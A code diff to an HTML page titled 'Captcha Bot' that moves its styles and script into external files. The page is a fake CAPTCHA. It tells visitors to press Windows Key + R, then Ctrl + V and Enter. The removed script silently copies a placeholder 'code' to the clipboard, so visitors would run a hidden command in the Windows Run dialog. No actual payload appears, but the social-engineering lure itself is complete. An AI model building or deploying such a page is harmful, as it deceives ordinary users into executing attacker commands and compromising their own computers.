@@ -4,38 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Captcha Bot</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-        }
-        .captcha-container {
-            text-align: center;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        .captcha-image {
-            width: 100%;
-            max-width: 300px;
-            margin-bottom: 20px;
-        }
-        .instruction {
-            font-size: 1.2em;
-            margin-bottom: 20px;
-        }
-        .button {
-            padding: 10px 20px;
-            font-size: 1em;
-            cursor: pointer;
-        }
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="captcha-container">
@@ -46,13 +15,6 @@
             Press Windows Key + R, then press Ctrl + V and Enter.
         </div>
     </div>
-    <script>
-        document.getElementById('solve-captcha').addEventListener('click', () => {
-            const code = 'your-robot-code-here'; // Replace with the actual code
-            navigator.clipboard.writeText(code).then(() => {
-                document.getElementById('additional-instruction').style.display = 'block';
-            });
-        });
-    </script>
+    <script src="javascript.js"></script>
 </body>
 </html>
